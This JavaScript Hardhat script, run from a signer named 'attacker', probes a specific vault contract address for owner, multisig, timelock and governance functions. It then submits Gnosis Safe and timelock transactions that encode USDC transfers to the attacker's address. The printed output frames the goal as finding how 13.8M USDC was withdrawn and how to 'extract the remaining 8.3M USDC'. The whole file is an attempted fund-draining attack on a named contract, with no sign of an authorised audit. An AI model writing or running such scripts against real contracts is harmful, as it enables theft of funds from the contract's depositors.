const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Analyze Multisig Pattern
 * @notice Check if vault is a multisig that requires multiple approvals
 * @dev Test signature-based withdrawals and governance patterns
 */
async function main() {
  console.log("\n🔐 ANALYZING MULTISIG/GOVERNANCE PATTERNS");
  console.log("=====================================");
  console.log("Theory: The 13.8M USDC withdrawal required multiple signatures or governance approval");
  
  const [attacker] = await ethers.getSigners();
  
  // Check current signers/owners
  console.log("\n👥 Checking for multiple owners/signers:");
  
  const ownerQueries = [
    { selector: "0x8da5cb5b", name: "owner()" },
    { selector: "0xa0e67e2b", name: "getOwners()" },
    { selector: "0x025e7c27", name: "owners(uint256)" },
    { selector: "0x2f54bf6e", name: "isOwner(address)" },
    { selector: "0xe75235b8", name: "getThreshold()" },
    { selector: "0x8b51d13f", name: "getThreshold(uint256)" },
    { selector: "0xaffed0e0", name: "nonce()" },
    { selector: "0x694e80c3", name: "changeThreshold(uint256)" }
  ];
  
  for (const { selector, name } of ownerQueries) {
    try {
      let data = selector;
      if (name.includes("uint256")) {
        data += ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [0]).slice(2);
      } else if (name.includes("address")) {
        data += ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      }
      
      const result = await attacker.call({
        to: VAULT_ADDRESS,
        data: data
      });
      
      if (result !== "0x") {
        console.log(`${name}: ${result}`);
        
        // Try to decode common patterns
        try {
          if (name === "owner()") {
            const decoded = ethers.AbiCoder.defaultAbiCoder().decode(["address"], result);
            console.log(`  → Owner: ${decoded[0]}`);
          } else if (name === "getOwners()") {
            const decoded = ethers.AbiCoder.defaultAbiCoder().decode(["address[]"], result);
            console.log(`  → Owners: ${decoded[0]}`);
          } else if (name === "getThreshold()") {
            const decoded = ethers.AbiCoder.defaultAbiCoder().decode(["uint256"], result);
            console.log(`  → Required signatures: ${decoded[0]}`);
          }
        } catch (e) {}
      }
    } catch (e) {}
  }
  
  // Test Gnosis Safe patterns
  console.log("\n🔍 Testing Gnosis Safe patterns:");
  
  const safeSelectors = [
    { selector: "0x6a761202", name: "execTransaction(...)", sig: "Safe transaction execution" },
    { selector: "0xd658b2c7", name: "execTransactionFromModule(...)", sig: "Module execution" },
    { selector: "0x468721a7", name: "execTransactionFromModuleReturnData(...)", sig: "Module with return" },
    { selector: "0x0d582f13", name: "addOwnerWithThreshold(address,uint256)", sig: "Add owner" },
    { selector: "0xf8dc5dd9", name: "removeOwner(address,address,uint256)", sig: "Remove owner" },
    { selector: "0xa0ab9653", name: "enableModule(address)", sig: "Enable module" }
  ];
  
  for (const { selector, name, sig } of safeSelectors) {
    try {
      const result = await attacker.call({
        to: VAULT_ADDRESS,
        data: selector + "00000000000000000000000000000000000000000000000000000000"
      });
      
      if (result !== "0x") {
        console.log(`✅ ${sig} exists`);
      }
    } catch (e) {
      if (!e.message.includes("revert") && !e.message.includes("invalid")) {
        console.log(`⚠️ ${sig} might exist (error: ${e.reason || e.message.slice(0, 50)})`);
      }
    }
  }
  
  // Test timelock patterns
  console.log("\n⏰ Testing timelock patterns:");
  
  const timelockSelectors = [
    { selector: "0xc1a287e2", name: "GRACE_PERIOD()" },
    { selector: "0x7d645fab", name: "MINIMUM_DELAY()" },
    { selector: "0xb1b43ae5", name: "MAXIMUM_DELAY()" },
    { selector: "0x0e18b681", name: "acceptAdmin()" },
    { selector: "0xce1d11fe", name: "queuedTransactions(bytes32)" },
    { selector: "0x01d5062a", name: "queueTransaction(...)" },
    { selector: "0x0825f38f", name: "executeTransaction(...)" },
    { selector: "0x591fcdfe", name: "cancelTransaction(...)" },
    { selector: "0xc1a7c2c5", name: "delay()" },
    { selector: "0xe177246e", name: "setDelay(uint256)" }
  ];
  
  for (const { selector, name } of timelockSelectors) {
    try {
      const result = await attacker.call({
        to: VAULT_ADDRESS,
        data: selector
      });
      
      if (result !== "0x") {
        console.log(`${name}: ${result}`);
        
        // Decode delay values
        if (name.includes("DELAY") || name === "delay()") {
          try {
            const decoded = ethers.AbiCoder.defaultAbiCoder().decode(["uint256"], result);
            console.log(`  → ${decoded[0]} seconds (${decoded[0] / 3600} hours)`);
          } catch (e) {}
        }
      }
    } catch (e) {}
  }
  
  // Test proposal/voting patterns
  console.log("\n🗳️ Testing governance patterns:");
  
  const govSelectors = [
    { selector: "0x02a4d90a", name: "propose(...)" },
    { selector: "0x160cbed7", name: "queue(uint256)" },
    { selector: "0xfe0d94c1", name: "execute(uint256)" },
    { selector: "0x9a802a6d", name: "proposalCount()" },
    { selector: "0x013cf08b", name: "proposals(uint256)" },
    { selector: "0x3932abb1", name: "proposalThreshold()" },
    { selector: "0x7b3c71d3", name: "castVote(uint256,uint8)" },
    { selector: "0xdeaaa7cc", name: "hashProposal(...)" }
  ];
  
  for (const { selector, name } of govSelectors) {
    try {
      const result = await attacker.call({
        to: VAULT_ADDRESS,
        data: selector + (name.includes("uint256") ? ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [0]).slice(2) : "")
      });
      
      if (result !== "0x") {
        console.log(`${name}: found`);
      }
    } catch (e) {}
  }
  
  // Try to find the actual withdrawal function that was used
  console.log("\n💰 Testing specialized withdrawal patterns:");
  
  // Create a test transaction similar to what might have been used
  const usdcAbi = ["function transfer(address to, uint256 amount) returns (bool)"];
  const usdc = new ethers.Contract(USDC_ADDRESS, usdcAbi, ethers.provider);
  
  // Common patterns for multisig USDC withdrawals
  const withdrawPatterns = [
    {
      name: "Gnosis Safe execTransaction",
      selector: "0x6a761202",
      encode: () => {
        const transferData = usdc.interface.encodeFunctionData("transfer", [
          attacker.address,
          ethers.parseUnits("1000", 6)
        ]);
        
        // execTransaction parameters
        return ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "bytes", "uint8", "uint256", "uint256", "uint256", "address", "address", "bytes"],
          [
            USDC_ADDRESS,  // to
            0,             // value
            transferData,  // data
            0,             // operation (0 = call)
            0,             // safeTxGas
            0,             // baseGas
            0,             // gasPrice
            ethers.ZeroAddress, // gasToken
            ethers.ZeroAddress, // refundReceiver
            "0x"           // signatures (empty for now)
          ]
        );
      }
    },
    {
      name: "Timelock executeTransaction",
      selector: "0x0825f38f",
      encode: () => {
        const transferData = usdc.interface.encodeFunctionData("transfer", [
          attacker.address,
          ethers.parseUnits("1000", 6)
        ]);
        
        return ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "string", "bytes", "uint256"],
          [
            USDC_ADDRESS,
            0,
            "",
            transferData,
            Math.floor(Date.now() / 1000) + 3600 // eta = 1 hour from now
          ]
        );
      }
    }
  ];
  
  for (const pattern of withdrawPatterns) {
    console.log(`\nTesting ${pattern.name}:`);
    
    try {
      const data = pattern.selector + pattern.encode().slice(2);
      const balanceBefore = await usdc.balanceOf(attacker.address);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 1000000
      });
      await tx.wait();
      
      const balanceAfter = await usdc.balanceOf(attacker.address);
      if (balanceAfter > balanceBefore) {
        console.log(`✅ SUCCESS! This is likely how the 13.8M was withdrawn!`);
      } else {
        console.log("❌ Transaction succeeded but no USDC received");
      }
    } catch (e) {
      console.log(`Failed: ${e.reason || e.message.slice(0, 80)}`);
    }
  }
  
  console.log("\n📊 ANALYSIS CONCLUSION:");
  console.log("=====================================");
  console.log("The 13.8M USDC withdrawal likely used one of these mechanisms:");
  console.log("1. Multisig (Gnosis Safe) - requires multiple owner signatures");
  console.log("2. Timelock - requires waiting period after queuing");
  console.log("3. Governance - requires proposal and voting");
  console.log("4. Custom access control - specific roles or conditions");
  console.log("\nTo extract the remaining 8.3M USDC, you would need:");
  console.log("- Multiple signatures from authorized owners (if multisig)");
  console.log("- Wait for timelock delay (if timelock)");
  console.log("- Create and pass a governance proposal (if DAO)");
  console.log("- Meet specific conditions defined in the contract");
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
